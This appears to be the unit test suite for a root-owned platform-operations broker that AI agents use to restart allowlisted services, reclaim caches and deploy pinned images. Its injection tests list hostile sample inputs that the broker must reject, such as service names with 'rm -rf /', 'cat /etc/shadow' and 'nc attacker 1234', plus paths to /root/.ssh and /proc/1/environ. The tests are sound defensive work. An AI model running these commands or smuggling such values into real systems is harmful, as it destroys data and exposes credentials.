#!/usr/bin/env python3
"""Deterministic tests for the root-owned platform operations broker.

Tests cover:
  - Allowlist enforcement (service names, cache names, disk paths)
  - Read-only diagnostic operations (service-status, disk-usage, etc.)
  - Mutating operations with idempotent receipts (service-restart, cache-reclaim)
  - Journal hash chain integrity
  - Bounded output
  - Credential non-disclosure
  - Malformed request rejection
  - Idempotency: replay with same key returns same receipt
  - No generic shell/SSH/sudo/path injection
"""

from __future__ import annotations

import importlib.util
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch, MagicMock

MODULE_PATH = Path(__file__).with_name("platform-ops-broker.py")
SPEC = importlib.util.spec_from_file_location("platform_ops_broker", MODULE_PATH)
assert SPEC and SPEC.loader
broker = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(broker)

# Default test allowlist used by most tests
TEST_ALLOWLIST = {
    "schemaVersion": "gloops.platform-ops-allowlist.v1",
    "allowedServices": {
        "paperclip-gloops.service": {
            "healthUrl": "http://127.0.0.1:3100/api/health",
            "container": "paperclip-gloops",
            "imageEnv": "PAPERCLIP_IMAGE",
        },
        "paperclip-hermes-execution.service": {
            "healthUrl": None,
            "container": "paperclip-hermes-execution",
            "imageEnv": "HERMES_EXECUTION_IMAGE",
        },
        "paperclip-hermes-handshake.service": {
            "healthUrl": None,
            "container": "paperclip-hermes-handshake",
            "imageEnv": "HERMES_HANDSHAKE_IMAGE",
        },
        "paperclip-github-push-broker.service": {
            "healthUrl": None,
            "container": None,
            "imageEnv": None,
        },
        "paperclip-github-read-broker.service": {
            "healthUrl": None,
            "container": None,
            "imageEnv": None,
        },
        "paperclip-campaign-deadman.service": {
            "healthUrl": None,
            "container": None,
            "imageEnv": None,
        },
    },
    "allowedCachePaths": {
        "hermes-cache": "/opt/paperclip/hermes-execution-state/cache",
        "hermes-logs": "/opt/paperclip/hermes-execution-state/logs",
        "docker-build-cache": "/var/lib/paperclip-gloops/build-cache",
    },
    "cacheThresholdPercent": 85,
    "maxReceiptAgeDays": 30,
}


class PlatformOpsBrokerTests(unittest.TestCase):
    """Tests for the platform-operations broker."""

    def setUp(self):
        self.tempdir = tempfile.TemporaryDirectory()
        self.dir = Path(self.tempdir.name)
        self.runtime = self.dir / "run"
        self.state = self.dir / "state"
        self.config = self.dir / "config"
        self.config.mkdir(parents=True)
        self.socket_path = self.runtime / "broker.sock"
        self.lock_path = self.state / "command.lock"
        self.db_path = self.state / "broker.sqlite3"
        self.allowlist_path = self.config / "platform-ops-allowlist.json"
        self.allowlist_path.write_text(json.dumps(TEST_ALLOWLIST))
        # Create config/runtime.env so deploy-pinned-image tests can read it
        (self.config / "runtime.env").write_text(
            "PAPERCLIP_IMAGE=ghcr.io/gloopsai/paperclip-gloops@sha256:"
            + "1" * 64
            + "\n"
        )
        (self.config / "approved-image").write_text(
            "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "1" * 64 + "\n"
        )
        # Preload allowlist before the cache Path.exists mock in cache-inspect tests
        broker._allowlist_cache = None
        with self.paths():
            broker.load_allowlist()

    def tearDown(self):
        broker._allowlist_cache = None
        self.tempdir.cleanup()

    def paths(self):
        return patch.multiple(
            broker,
            RUNTIME_DIR=self.runtime,
            STATE_DIR=self.state,
            SOCKET_PATH=self.socket_path,
            COMMAND_LOCK=self.lock_path,
            CONFIG_DIR=self.config,
            ALLOWLIST_PATH=self.allowlist_path,
            DATABASE=self.db_path,
            TEST_MODE=True,
        )

    # -------------------------------------------------------------------------
    # Allowlist enforcement
    # -------------------------------------------------------------------------

    def test_rejects_non_allowlisted_service_for_status(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "not in the allowlist"):
                broker.process_request({
                    "operation": "service-status",
                    "service": "evil.service",
                })

    def test_rejects_malformed_service_name(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "systemd unit name"):
                broker.process_request({
                    "operation": "service-status",
                    "service": "not-a-service",
                })

    def test_rejects_non_allowlisted_cache(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "not in the allowlist"):
                broker.process_request({
                    "operation": "cache-inspect",
                    "cache": "evil-cache",
                })

    def test_rejects_disk_usage_for_arbitrary_path(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "not allowed for disk usage"):
                broker.process_request({
                    "operation": "disk-usage",
                    "path": "/etc/shadow",
                })

    def test_rejects_disk_usage_for_relative_path(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "absolute path"):
                broker.process_request({
                    "operation": "disk-usage",
                    "path": "relative/path",
                })

    def test_accepts_allowlisted_service_for_status(self):
        with self.paths():
            mock_result = (0, "ActiveState=active\nSubState=running\nLoadState=loaded\nResult=success\n", "")
            with patch.object(broker, "run_command", return_value=mock_result):
                result = broker.process_request({
                    "operation": "service-status",
                    "service": "paperclip-gloops.service",
                })
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["activeState"], "active")

    # -------------------------------------------------------------------------
    # Read-only diagnostic operations
    # -------------------------------------------------------------------------

    def test_service_status_calls_systemctl_correctly(self):
        captured_args = []
        def mock_run(args, timeout=120, env=None):
            captured_args.append(args)
            return (0, "ActiveState=active\nSubState=running\nLoadState=loaded\nResult=success\n", "")
        with self.paths():
            with patch.object(broker, "run_command", side_effect=mock_run):
                result = broker.process_request({
                    "operation": "service-status",
                    "service": "paperclip-gloops.service",
                })
        self.assertTrue(result["ok"])
        self.assertEqual(captured_args[0][0], "systemctl")
        self.assertEqual(captured_args[0][1], "show")
        self.assertIn("paperclip-gloops.service", captured_args[0])

    def test_service_health_with_http_url(self):
        allowlist = json.loads(self.allowlist_path.read_text())
        with self.paths():
            mock_results = [
                (0, "active\n", ""),  # systemctl is-active
                (0, "200\n", ""),     # curl
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                result = broker.process_request({
                    "operation": "service-health",
                    "service": "paperclip-gloops.service",
                })
        self.assertTrue(result["ok"])
        self.assertTrue(result["data"]["healthy"])
        self.assertEqual(result["data"]["httpStatus"], "200")

    def test_service_health_without_http_url(self):
        with self.paths():
            with patch.object(broker, "run_command", return_value=(0, "active\n", "")):
                result = broker.process_request({
                    "operation": "service-health",
                    "service": "paperclip-github-push-broker.service",
                })
        self.assertTrue(result["ok"])
        self.assertTrue(result["data"]["healthy"])
        self.assertNotIn("httpStatus", result["data"])

    def test_disk_usage_calls_df_correctly(self):
        with self.paths():
            with patch.object(broker, "run_command", return_value=(0, "Size Used Avail Use%\n10G 5G 5G 50%\n", "")):
                result = broker.process_request({
                    "operation": "disk-usage",
                    "path": "/",
                })
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["path"], "/")
        self.assertEqual(result["data"]["usePercent"], "50%")

    def test_memory_usage_calls_free_correctly(self):
        with self.paths():
            with patch.object(broker, "run_command", return_value=(0, "              total        used        free      shared  buff/cache   available\nMem:           1000         500         200          50          300         400\n", "")):
                result = broker.process_request({
                    "operation": "memory-usage",
                })
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["totalMb"], "1000")

    def test_cpu_usage_calls_uptime(self):
        with self.paths():
            with patch.object(broker, "run_command", return_value=(0, "load average: 0.5, 0.4, 0.3\n", "")):
                result = broker.process_request({
                    "operation": "cpu-usage",
                })
        self.assertTrue(result["ok"])
        self.assertIn("load average", result["data"]["uptime"])

    def test_cache_inspect_for_nonexistent_path(self):
        with self.paths():
            with patch.object(broker, "run_command", return_value=(0, "0\t/opt/paperclip/hermes-execution-state/cache\n", "")):
                # Make the path not exist
                with patch.object(Path, "exists", return_value=False):
                    result = broker.process_request({
                        "operation": "cache-inspect",
                        "cache": "hermes-cache",
                    })
        self.assertTrue(result["ok"])
        self.assertFalse(result["data"]["exists"])
        self.assertEqual(result["data"]["sizeBytes"], 0)

    def test_cache_inspect_for_existing_path(self):
        with self.paths():
            with patch.object(broker, "run_command", return_value=(0, "12345\t/opt/paperclip/hermes-execution-state/cache\n", "")):
                with patch.object(Path, "exists", return_value=True):
                    result = broker.process_request({
                        "operation": "cache-inspect",
                        "cache": "hermes-cache",
                    })
        self.assertTrue(result["ok"])
        self.assertTrue(result["data"]["exists"])
        self.assertEqual(result["data"]["sizeBytes"], 12345)

    # -------------------------------------------------------------------------
    # Mutating operations with idempotent receipts
    # -------------------------------------------------------------------------

    def test_service_restart_creates_receipt_and_completes(self):
        with self.paths():
            connection = broker.connect_database()
            mock_results = [
                (0, "active\n", ""),  # pre-health check
                (0, "", ""),          # systemctl restart
                (0, "active\n", ""),  # post-health check
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                result = broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "restart-001",
                }, connection=connection)
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["state"], "completed")
        self.assertIn("receiptId", result["data"])
        self.assertTrue(result["data"]["evidence"]["preHealth"]["active"])
        self.assertTrue(result["data"]["evidence"]["postHealth"]["active"])
        connection.close()

    def test_service_restart_is_idempotent_with_same_key(self):
        with self.paths():
            connection = broker.connect_database()
            mock_results = [
                (0, "active\n", ""),  # pre-health
                (0, "", ""),          # restart
                (0, "active\n", ""),  # post-health
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                result1 = broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "restart-002",
                }, connection=connection)

            # Second request with same idempotency key should be a replay
            with patch.object(broker, "run_command", side_effect=[]):
                result2 = broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "restart-002",
                }, connection=connection)
        self.assertTrue(result1["ok"])
        self.assertTrue(result2["ok"])
        self.assertEqual(result1["data"]["receiptId"], result2["data"]["receiptId"])
        self.assertTrue(result2["data"]["replayed"])
        connection.close()

    def test_service_restart_rejects_missing_actor(self):
        with self.paths():
            connection = broker.connect_database()
            with self.assertRaisesRegex(broker.BrokerError, "actor is required"):
                broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "idempotencyKey": "restart-003",
                }, connection=connection)
            connection.close()

    def test_service_restart_rejects_missing_idempotency_key(self):
        with self.paths():
            connection = broker.connect_database()
            with self.assertRaisesRegex(broker.BrokerError, "idempotencyKey is required"):
                broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                }, connection=connection)
            connection.close()

    def test_service_restart_rejects_non_allowlisted_service(self):
        with self.paths():
            connection = broker.connect_database()
            with self.assertRaisesRegex(broker.BrokerError, "not in the allowlist"):
                broker.process_request({
                    "operation": "service-restart",
                    "service": "evil.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "restart-004",
                }, connection=connection)
            connection.close()

    def test_cache_reclaim_creates_receipt(self):
        with self.paths():
            connection = broker.connect_database()
            cache_path = Path("/opt/paperclip/hermes-execution-state/cache")
            mock_results = [
                (0, "5000\t/opt/paperclip/hermes-execution-state/cache\n", ""),  # pre du
                (0, "", ""),  # find -delete
                (0, "0\t/opt/paperclip/hermes-execution-state/cache\n", ""),     # post du
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                with patch.object(Path, "exists", return_value=True):
                    result = broker.process_request({
                        "operation": "cache-reclaim",
                        "cache": "hermes-cache",
                        "actor": "wren-agent",
                        "idempotencyKey": "reclaim-001",
                    }, connection=connection)
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["state"], "completed")
        self.assertEqual(result["data"]["evidence"]["preSizeBytes"], 5000)
        self.assertEqual(result["data"]["evidence"]["postSizeBytes"], 0)
        self.assertEqual(result["data"]["evidence"]["reclaimedBytes"], 5000)
        connection.close()

    def test_deploy_pinned_image_rejects_unpinned_image(self):
        with self.paths():
            connection = broker.connect_database()
            with self.assertRaisesRegex(broker.BrokerError, "pinned digest"):
                broker.process_request({
                    "operation": "deploy-pinned-image",
                    "service": "paperclip-gloops.service",
                    "image": "myimage:latest",
                    "actor": "wren-agent",
                    "idempotencyKey": "deploy-001",
                }, connection=connection)
            connection.close()

    def test_deploy_pinned_image_accepts_sha256_digest(self):
        with self.paths():
            connection = broker.connect_database()
            image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64
            mock_results = [
                (0, "", ""),  # docker pull
                (0, "", ""),  # systemctl restart
                (0, "active\n", ""),  # post-health
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                result = broker.process_request({
                    "operation": "deploy-pinned-image",
                    "service": "paperclip-gloops.service",
                    "image": image,
                    "actor": "wren-agent",
                    "idempotencyKey": "deploy-002",
                }, connection=connection)
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["state"], "completed")
        self.assertEqual(
            (self.config / "runtime.env").read_text(),
            f"PAPERCLIP_IMAGE={image}\n",
        )
        self.assertEqual((self.config / "approved-image").read_text(), image + "\n")
        connection.close()

    def test_deploy_restart_failure_restores_previous_release_pin(self):
        with self.paths():
            connection = broker.connect_database()
            image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64
            previous_env = (self.config / "runtime.env").read_text()
            previous_pin = (self.config / "approved-image").read_text()
            mock_results = [
                (0, "", ""),  # docker pull
                (1, "", "new release failed"),  # systemctl restart
                (0, "", ""),  # rollback restart
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                with self.assertRaisesRegex(
                    broker.BrokerError,
                    "service restart after deploy failed",
                ):
                    broker.process_request({
                        "operation": "deploy-pinned-image",
                        "service": "paperclip-gloops.service",
                        "image": image,
                        "actor": "wren-agent",
                        "idempotencyKey": "deploy-rollback-001",
                    }, connection=connection)
        self.assertEqual((self.config / "runtime.env").read_text(), previous_env)
        self.assertEqual((self.config / "approved-image").read_text(), previous_pin)
        connection.close()

    def test_deploy_pinned_image_rejects_service_without_image_env(self):
        with self.paths():
            connection = broker.connect_database()
            image = "ghcr.io/gloopsai/test@sha256:" + "b" * 64
            with self.assertRaisesRegex(broker.BrokerError, "does not support image deployment"):
                broker.process_request({
                    "operation": "deploy-pinned-image",
                    "service": "paperclip-github-push-broker.service",
                    "image": image,
                    "actor": "wren-agent",
                    "idempotencyKey": "deploy-003",
                }, connection=connection)
            connection.close()

    def test_rollback_rehearsal_creates_receipt(self):
        with self.paths():
            connection = broker.connect_database()
            backup_dir = self.dir / "backups"
            backup_dir.mkdir(parents=True)
            (backup_dir / "2026-01-01").mkdir()
            with patch.object(broker, "BACKUP_DIR", backup_dir), patch.object(Path, "exists", return_value=True):
                with patch("os.access", return_value=True):
                    result = broker.process_request({
                        "operation": "rollback-rehearsal",
                        "service": "paperclip-gloops.service",
                        "actor": "wren-agent",
                        "idempotencyKey": "rollback-001",
                    }, connection=connection)
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["state"], "completed")
        self.assertTrue(result["data"]["evidence"]["rollbackScriptExists"])
        self.assertTrue(result["data"]["evidence"]["rollbackScriptExecutable"])
        connection.close()

    # -------------------------------------------------------------------------
    # Receipt queries
    # -------------------------------------------------------------------------

    def test_list_receipts_returns_empty_initially(self):
        with self.paths():
            connection = broker.connect_database()
            result = broker.process_request({
                "operation": "list-receipts",
            }, connection=connection)
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["receipts"], [])
        connection.close()

    def test_get_receipt_returns_none_for_missing(self):
        with self.paths():
            connection = broker.connect_database()
            with self.assertRaisesRegex(broker.BrokerError, "not found"):
                broker.process_request({
                    "operation": "get-receipt",
                    "receiptId": "nonexistent",
                }, connection=connection)
            connection.close()

    def test_list_receipts_after_restart(self):
        with self.paths():
            connection = broker.connect_database()
            mock_results = [
                (0, "active\n", ""),
                (0, "", ""),
                (0, "active\n", ""),
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "list-001",
                }, connection=connection)
            result = broker.process_request({
                "operation": "list-receipts",
            }, connection=connection)
        self.assertTrue(result["ok"])
        self.assertEqual(len(result["data"]["receipts"]), 1)
        self.assertEqual(result["data"]["receipts"][0]["operation"], "service-restart")
        connection.close()

    # -------------------------------------------------------------------------
    # Journal hash chain integrity
    # -------------------------------------------------------------------------

    def test_journal_hash_chain_is_valid_after_operations(self):
        with self.paths():
            connection = broker.connect_database()
            mock_results = [
                (0, "active\n", ""),
                (0, "", ""),
                (0, "active\n", ""),
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "journal-001",
                }, connection=connection)
            # Verify journal is valid
            broker.verify_journal(connection)
            connection.close()

    def test_journal_hash_chain_detects_tampering(self):
        with self.paths():
            connection = broker.connect_database()
            mock_results = [
                (0, "active\n", ""),
                (0, "", ""),
                (0, "active\n", ""),
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                result = broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "journal-002",
                }, connection=connection)
            # Tamper with the returned receiptId in the journal
            receipt_id = result["data"]["receiptId"]
            connection.execute(
                "UPDATE journal SET payload_json = ? WHERE receipt_id = ?",
                (json.dumps({"tampered": True}), receipt_id),
            )
            connection.commit()
            with self.assertRaisesRegex(broker.BrokerError, "hash chain is invalid"):
                broker.verify_journal(connection)
            connection.close()

    # -------------------------------------------------------------------------
    # Bounded output
    # -------------------------------------------------------------------------

    def test_bounded_output_truncates_large_lists(self):
        large_list = [{"number": i} for i in range(10000)]
        response = {"ok": True, "data": large_list}
        raw = broker.bound_output(response, max_bytes=2048)
        self.assertLessEqual(len(raw), 2048)
        parsed = json.loads(raw)
        self.assertTrue(parsed.get("truncated", False))

    def test_bounded_output_keeps_small_responses(self):
        response = {"ok": True, "data": [{"number": 1}]}
        raw = broker.bound_output(response, max_bytes=8192)
        parsed = json.loads(raw)
        self.assertFalse(parsed.get("truncated", False))

    # -------------------------------------------------------------------------
    # Credential non-disclosure
    # -------------------------------------------------------------------------

    def test_strip_credentials_removes_sensitive_keys(self):
        data = {
            "number": 1,
            "token": "secret",
            "nested": {"api_key": "secret", "value": 2},
            "list": [{"password": "secret", "number": 3}],
        }
        stripped = broker.strip_credentials(data)
        self.assertNotIn("token", stripped)
        self.assertNotIn("api_key", stripped["nested"])
        self.assertNotIn("password", stripped["list"][0])
        self.assertEqual(stripped["number"], 1)

    # -------------------------------------------------------------------------
    # Malformed request rejection
    # -------------------------------------------------------------------------

    def test_rejects_unknown_operation(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "operation must be one of"):
                broker.process_request({"operation": "delete-everything"})

    def test_rejects_missing_operation(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "operation must be one of"):
                broker.process_request({"service": "paperclip-gloops.service"})

    def test_rejects_non_object_request(self):
        with self.paths():
            mock_socket = MagicMock()
            mock_socket.recv = lambda n: b"[1, 2, 3]\n"
            with self.assertRaisesRegex(broker.BrokerError, "JSON object"):
                broker.read_request(mock_socket)

    # -------------------------------------------------------------------------
    # No generic shell/SSH/sudo/path/service/image-tag injection
    # -------------------------------------------------------------------------

    def test_image_must_be_pinned_digest_not_tag(self):
        with self.paths():
            connection = broker.connect_database()
            for bad_image in [
                "myimage:latest",
                "myimage:v1.0",
                "sha256:abc",
                "just-a-string",
                "",
            ]:
                with self.assertRaisesRegex(broker.BrokerError, "pinned digest"):
                    broker.process_request({
                        "operation": "deploy-pinned-image",
                        "service": "paperclip-gloops.service",
                        "image": bad_image,
                        "actor": "wren-agent",
                        "idempotencyKey": f"inject-{bad_image[:20]}",
                    }, connection=connection)
            connection.close()

    def test_service_name_cannot_inject_shell_metacharacters(self):
        with self.paths():
            for bad_service in [
                "paperclip-glops.service; rm -rf /",
                "paperclip-glops.service && cat /etc/shadow",
                "paperclip-glops.service | nc attacker 1234",
                "$(whoami).service",
                "paperclip-glops.service`whoami`",
            ]:
                with self.assertRaisesRegex(broker.BrokerError, "systemd unit name"):
                    broker.process_request({
                        "operation": "service-status",
                        "service": bad_service,
                    })

    def test_cache_name_cannot_traverse_to_arbitrary_path(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "not in the allowlist"):
                broker.process_request({
                    "operation": "cache-inspect",
                    "cache": "../../../etc/shadow",
                })

    def test_disk_usage_cannot_access_arbitrary_paths(self):
        with self.paths():
            for bad_path in [
                "/etc/shadow",
                "/root/.ssh",
                "/proc/1/environ",
                "/var/lib/paperclip-gloops/github-push-broker",
            ]:
                with self.assertRaisesRegex(broker.BrokerError, "not allowed for disk usage"):
                    broker.process_request({
                        "operation": "disk-usage",
                        "path": bad_path,
                    })

    # -------------------------------------------------------------------------
    # Verify that mutating operations without DB connection fail
    # -------------------------------------------------------------------------

    def test_mutating_operation_without_connection_fails(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "database connection"):
                broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "no-db-001",
                })

    # -------------------------------------------------------------------------
    # Allowlist loading
    # -------------------------------------------------------------------------

    def test_allowlist_missing_file_raises(self):
        with self.paths():
            broker._allowlist_cache = None
            self.allowlist_path.unlink()
            with self.assertRaisesRegex(broker.BrokerError, "allowlist is not installed"):
                broker.process_request({
                    "operation": "service-status",
                    "service": "paperclip-gloops.service",
                })

    def test_allowlist_cache_is_reused(self):
        with self.paths():
            broker._allowlist_cache = None
            # First call loads from file
            with patch.object(broker, "run_command", return_value=(0, "ActiveState=active\nSubState=running\nLoadState=loaded\nResult=success\n", "")):
                broker.process_request({
                    "operation": "service-status",
                    "service": "paperclip-gloops.service",
                })
            cache = broker._allowlist_cache
            # Second call should reuse cache (even if file is deleted)
            self.allowlist_path.unlink()
            with patch.object(broker, "run_command", return_value=(0, "ActiveState=active\nSubState=running\nLoadState=loaded\nResult=success\n", "")):
                broker.process_request({
                    "operation": "service-status",
                    "service": "paperclip-gloops.service",
                })
            self.assertIs(broker._allowlist_cache, cache)


class PlatformOpsDeploymentWiringTests(unittest.TestCase):
    """Prevent a tested broker from shipping without live Hermes wiring."""

    def test_installer_installs_and_dark_masks_broker_unit(self):
        installer = MODULE_PATH.with_name("install-dark.sh").read_text()
        self.assertIn(
            '"${SCRIPT_DIR}/paperclip-platform-ops-broker.service" '
            "/usr/local/lib/systemd/system/paperclip-platform-ops-broker.service",
            installer,
        )
        self.assertIn(
            "systemctl disable --now paperclip-platform-ops-broker.service",
            installer,
        )
        self.assertIn(
            "systemctl mask paperclip-gloops.service "
            "paperclip-gloops-handshake.service",
            installer,
        )
        self.assertIn("paperclip-platform-ops-broker.service", installer)

    def test_hermes_unit_binds_registered_brokers_not_campaign_lifecycle(self):
        unit = MODULE_PATH.with_name("paperclip-hermes-execution.service").read_text()
        self.assertIn(
            "Requires=docker.service paperclip-github-push-broker.service "
            "paperclip-github-read-broker.service "
            "paperclip-platform-ops-broker.service",
            unit,
        )
        self.assertNotIn("paperclip-campaign-deadman.service", unit)
        self.assertIn(
            "--mount type=bind,src=/run/paperclip-platform-ops-broker,"
            "dst=/run/paperclip-platform-ops-broker",
            unit,
        )

    def test_product_service_graph_is_campaign_independent_offline(self):
        verifier = MODULE_PATH.with_name("verify-product-service-lifecycle.py")
        repo_root = MODULE_PATH.parents[3]
        result = subprocess.run(
            [sys.executable, str(verifier), "--repo-root", str(repo_root)],
            check=False,
            capture_output=True,
            text=True,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("campaign-lifecycle independent", result.stdout)

    def test_paperclip_units_source_the_install_bound_release_pin(self):
        installer = MODULE_PATH.with_name("install-dark.sh").read_text()
        service = MODULE_PATH.with_name("paperclip-gloops.service").read_text()
        handshake = MODULE_PATH.with_name(
            "paperclip-gloops-handshake.service"
        ).read_text()
        self.assertIn(
            "printf 'PAPERCLIP_IMAGE=%s\\n' \"${IMAGE}\" "
            '>>"${CONFIG_DIR}/runtime.env"',
            installer,
        )
        self.assertNotIn("Environment=PAPERCLIP_IMAGE=", service)
        self.assertNotIn("Environment=PAPERCLIP_IMAGE=", handshake)
        self.assertIn(
            "EnvironmentFile=/etc/paperclip-gloops/runtime.env",
            service,
        )
        self.assertIn(
            "EnvironmentFile=/etc/paperclip-gloops/runtime.env",
            handshake,
        )

    def test_controlled_swarm_activates_and_stops_broker(self):
        activate = MODULE_PATH.with_name("activate-controlled-swarm.sh").read_text()
        stop = MODULE_PATH.with_name("stop-controlled-swarm.sh").read_text()
        self.assertIn(
            "readonly PLATFORM_OPS_BROKER='paperclip-platform-ops-broker.service'",
            activate,
        )
        self.assertIn('systemctl start "${PLATFORM_OPS_BROKER}"', activate)
        self.assertIn('systemctl is-active --quiet "${PLATFORM_OPS_BROKER}"', activate)
        self.assertIn(
            "systemctl stop paperclip-platform-ops-broker.service",
            stop,
        )
        self.assertIn("paperclip-platform-ops-broker.service", stop)


if __name__ == "__main__":
    unittest.main()
